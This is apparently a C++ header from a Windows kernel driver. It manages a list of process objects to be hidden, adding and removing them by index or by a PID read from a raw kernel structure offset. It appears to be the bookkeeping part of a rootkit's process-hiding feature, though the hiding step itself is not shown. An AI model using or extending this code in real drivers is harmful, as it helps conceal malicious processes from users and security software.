#pragma once
#include "definitions.h"


class HideProcess {
public:
	PVOID HiddenList = NULL;
	ULONG HiddenCount = 0;
	SIZE_T BufferSize = 0;
	BOOL AddToHidden(PEPROCESS AddHidden) {
		PVOID TempHidden = ExAllocatePoolWithTag(NonPagedPool, BufferSize + sizeof(PEPROCESS), 'ThPb');
		if (TempHidden == NULL) {
			return FALSE;
		}
		if (HiddenList != NULL) {
			RtlCopyMemory(TempHidden, HiddenList, BufferSize);
		}
		RtlCopyMemory((PVOID)((SIZE_T)TempHidden + BufferSize), &AddHidden, sizeof(PEPROCESS));
		if (HiddenList != NULL) {
			ExFreePool(HiddenList);
		}
		HiddenList = ExAllocatePoolWithTag(NonPagedPool, BufferSize + sizeof(PEPROCESS), 'HpMb');
		if (HiddenList == NULL) {
			ExFreePool(TempHidden);
			return FALSE;
		}
		RtlCopyMemory(HiddenList, TempHidden, BufferSize + sizeof(PEPROCESS));
		ExFreePool(TempHidden);
		BufferSize += sizeof(PEPROCESS);
		HiddenCount++;
		return TRUE;
	}


	BOOL RemoveFromHidden(ULONG64 ProcessId, ULONG HiddenIndex, PEPROCESS* UnhiddenProcess) {
		PEPROCESS RemoveProcess = NULL;
		PEPROCESS CurrentProcess = NULL;
		PVOID TempHidden = NULL;
		ULONG CurrentIndex = 0;
		if (BufferSize == 0 || HiddenCount == 0 || HiddenList == NULL) {
			return FALSE;  // Invalid parameters
		}
		if (HiddenIndex >= HiddenCount) {
			// Search process to remove by PID:
			if (ProcessId == 0) {
				return FALSE;
			}
			for (CurrentIndex = 0; CurrentIndex < HiddenCount; CurrentIndex++) {
				RtlCopyMemory(&CurrentProcess, (PVOID)((ULONG64)HiddenList + (CurrentIndex * sizeof(PEPROCESS))), sizeof(PEPROCESS));
				if (*(ULONG64*)((ULONG64)CurrentProcess + EPOF_UniqueProcessId) == ProcessId) {
					HiddenIndex = CurrentIndex;
					break;
				}
			}
			if (CurrentIndex == HiddenCount) {
				return FALSE;
			}
		}
		RtlCopyMemory(&RemoveProcess, (PVOID)((ULONG64)HiddenList + (HiddenIndex * sizeof(PEPROCESS))), sizeof(PEPROCESS));
		TempHidden = ExAllocatePoolWithTag(NonPagedPool, BufferSize - sizeof(PEPROCESS), 'ThPb');
		if (TempHidden == NULL) {
			return FALSE;
		}
		if (HiddenIndex == 0) {
			RtlCopyMemory(TempHidden, (PVOID)((ULONG64)HiddenList + sizeof(PEPROCESS)), BufferSize - sizeof(PEPROCESS));
		}
		else if (HiddenIndex == HiddenCount - 1) {
			RtlCopyMemory(TempHidden, HiddenList, BufferSize - sizeof(PEPROCESS));
		}
		else {
			RtlCopyMemory(TempHidden, HiddenList, HiddenIndex * sizeof(PEPROCESS));
			RtlCopyMemory((PVOID)((ULONG64)TempHidden + HiddenIndex * sizeof(PEPROCESS)), (PVOID)((ULONG64)HiddenList + (HiddenIndex + 1) * sizeof(PEPROCESS)), BufferSize - ((HiddenIndex + 1) * sizeof(PEPROCESS)));
		}
		*UnhiddenProcess = RemoveProcess;  // Save renmoved PEPROCESS pointer to return to caller
		if (HiddenList != NULL) {
			ExFreePool(HiddenList);
		}
		HiddenList = ExAllocatePoolWithTag(NonPagedPool, BufferSize - sizeof(PEPROCESS), 'HpMb');
		if (HiddenList == NULL) {
			ExFreePool(TempHidden);
			return FALSE;
		}
		RtlCopyMemory(HiddenList, TempHidden, BufferSize - sizeof(PEPROCESS));
		ExFreePool(TempHidden);
		BufferSize -= sizeof(PEPROCESS);
		HiddenCount--;
		return TRUE;
	}
};
HideProcess ProcessHide = { 0 };